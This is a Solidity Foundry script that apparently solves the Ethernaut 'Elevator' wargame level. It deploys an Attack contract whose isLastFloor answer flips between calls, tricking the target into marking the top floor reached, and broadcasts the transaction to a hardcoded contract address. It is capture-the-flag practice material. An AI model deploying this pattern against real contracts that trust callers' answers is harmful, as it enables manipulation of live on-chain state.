// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Elevator} from "../../src/Ethernaut/Elevator.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Elevator elevator = Elevator(0xc153c1648999aDd317c3fB36714E9847DcEB1b2E);
        Attack attack = new Attack(payable(address(elevator)));
        attack.attack();
        vm.stopBroadcast();
    }
}

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Attack {
    address payable orgContract;

    constructor(address payable _levelInstance) payable {
        orgContract = _levelInstance;
    }

    uint256 public balance;
    uint256 public count = 0;

    function isLastFloor(uint256 floor) public returns (bool) {
        if (count == 0) {
            count += 1;
            return false;
        } else {
            return true;
        }
    }

    function attack() public payable {
        IElevator(orgContract).goTo(1);
    }
}
